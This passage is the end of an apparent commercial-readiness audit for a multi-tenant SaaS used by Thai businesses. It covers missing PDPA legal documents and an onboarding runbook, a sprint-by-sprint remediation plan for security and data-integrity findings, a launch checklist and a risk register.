### CHD-01 · No Terms of Service, Privacy Policy, or Data Processing Agreement template

**Risk:** Commercial SaaS selling to Thai businesses must comply with PDPA (Personal Data Protection Act B.E. 2562). Collecting customer names, phone numbers, and repair history constitutes personal data processing. Without a DPA, selling to any business that serves end customers is non-compliant.

**Required documents:**
1. Privacy Policy (Thai + English)
2. Terms of Service
3. Data Processing Agreement (for B2B customers)
4. Cookie Policy (if web portal accessed by end customers)

**Blocks selling:** YES for regulated customers (hospitals, government, listed companies)

---

### CHD-02 · No multi-tenant onboarding runbook

**Risk:** When the first commercial customer signs up, there is no documented procedure for: creating their tenant, seeding their OWNER account, configuring their branch(es), setting their subscription tier, testing their environment before handover.

**Required document:** `docs/commercial-readiness/tenant-onboarding-runbook.md` covering:
- Tenant creation via super-admin panel
- Owner account seeding with force-password-change
- Branch setup and printer configuration
- SUNMI APK distribution process
- First-day support checklist

**Blocks selling:** NO (operational risk)

---

## Implementation Roadmap

### Sprint 1 — Weeks 1–2 (BLOCKERS only)

| ID | Task | Est. hours |
|----|------|-----------|
| CHB-01 | Move JWT to HTTP-only cookie | 16h |
| CHB-02 | Scope notifications to tenant/user | 8h |
| CHB-03 | Wrap debt payment in `$transaction` | 2h |
| CHB-04 | Tenant validation on all `findOne` | 16h |
| CHB-05 | Add `@Max()` to all financial DTOs | 6h |
| CHB-06 | Add permission guards to 6 modules | 8h |
| CHB-07 | Add `tenantId` to JWT payload | 4h |
| CHB-08 | Fail-loud API baseURL | 1h |
| CHB-09 | Install Helmet middleware | 1h |
| CHB-10 | Atomic stock transfer/PO receive | 8h |
| CHB-11 | CSP header in nginx | 2h |
| **Total Sprint 1** | | **72h** |

### Sprint 2 — Weeks 3–4 (HIGH severity)

| ID | Task | Est. hours |
|----|------|-----------|
| CHH-01 | Carrier wallet atomic balance | 4h |
| CHH-02 | Add missing audit logs | 10h |
| CHH-03 | Sanitise validation errors in prod | 2h |
| CHH-04 | Permission guard TTL cache | 4h |
| CHH-05 | Sync SUNMI status transitions | 3h |
| CHH-06 | Audit `X-Branch-Id` usage | 4h |
| CHH-07 | PO payment confirm dialog | 2h |
| CHH-08 | Product delete confirm + permission | 2h |
| CHH-11 | Configure off-site backup | 4h |
| CHH-13 | Password policy enforcement | 4h |
| CHD-01 | Legal document templates | External |
| **Total Sprint 2** | | **39h** |

### Sprint 3 — Weeks 5–6 (MEDIUM severity)

| ID | Task | Est. hours |
|----|------|-----------|
| CHM-01–13 | Medium fixes | 50h |
| CHH-10 | Pagination on dashboard/reports | 8h |
| CHH-09 | SSE for real-time notifications | 12h |
| CHH-14 | smoke-test-prod.ps1 | 4h |
| CHD-02 | Tenant onboarding runbook | 6h |
| **Total Sprint 3** | | **80h** |

### Sprint 4 — Weeks 7–8 (LOW, UX, regression tests)

| ID | Task | Est. hours |
|----|------|-----------|
| CHL-01–08 | Low severity fixes | 20h |
| CHU-01–04 | UX improvements | 12h |
| Regression tests | All new test suites | 40h |
| Penetration test | External security assessment | External |
| **Total Sprint 4** | | **72h** |

---

## Commercial Launch Checklist

```
SECURITY
[ ] CHB-01: JWT in HTTP-only cookie (not localStorage)
[x] CHB-02: Notification tenant scoping ✅ S1.2
[x] CHB-07: tenantId in JWT payload ✅ S1.1
[x] CHB-09 / BLK-1: Helmet middleware installed ✅ S1.1
[x] BLK-2: CORS fail-loud when CORS_ORIGIN unset ✅ S1.1
[x] CHB-08: API baseURL fail-loud at build time ✅ S1.1
[x] BLK-4: Health endpoint probes database ✅ S1.1
[x] BLK-5: SUPER_ADMIN_PASSWORD validator check ✅ S1.1
[x] CHB-11: CSP header in nginx ✅ S1.4

FINANCIAL INTEGRITY
[x] CHB-03: Debt payment in transaction ✅ S1.3
[x] CHB-05: @Max() on all financial DTOs ✅ S1.4
[x] CHB-10: Atomic stock transfer/PO receive ✅ S1.3
[ ] CHH-01: Carrier wallet race condition fixed
[ ] CHH-02: Audit logs on all financial mutations

DATA ISOLATION
[x] CHB-02: Notification tenant scoping ✅ S1.2
[x] CHB-04: Tenant check on all findOne calls ✅ S1.2
[x] CHB-06: Permission guards on all write endpoints ✅ S1.2
[ ] CHH-06: X-Branch-Id header not used for security scoping
[ ] CHM-09: Serial lookup tenant-scoped

LEGAL / COMPLIANCE
[ ] CHD-01: Privacy Policy, ToS, DPA available
[ ] CHD-02: Tenant onboarding runbook documented

OPERATIONS
[ ] CHH-11: Off-site backup configured and tested
[ ] CHH-14: smoke-test-prod.ps1 created and passing
[ ] validate-prod-env.ps1 runs to exit 0
[ ] Full vitest suite passes (867/867)
[ ] External penetration test completed
```

---

## Risk Register

| Risk | Probability | Impact | Mitigation |
|------|------------|--------|-----------|
| Token theft via XSS (CHB-01 unfixed) | Medium | CRITICAL | Fix CHB-01 before any customer |
| Cross-tenant data access (CHB-04 unfixed) | Low (UUIDs hard to guess) | CRITICAL | Fix CHB-04 before any customer |
| Data loss on hardware failure (CHH-11 unfixed) | Low | HIGH | Fix before first customer data |
| Staff fraud via missing guards (CHB-06) | Medium | HIGH | Fix before first employee added |
| Negative carrier balance (CHH-01) | Medium | HIGH | Fix before first carrier sale |

---

*Document produced from static code analysis. No code was modified.*  
*All findings require owner approval before implementation begins.*
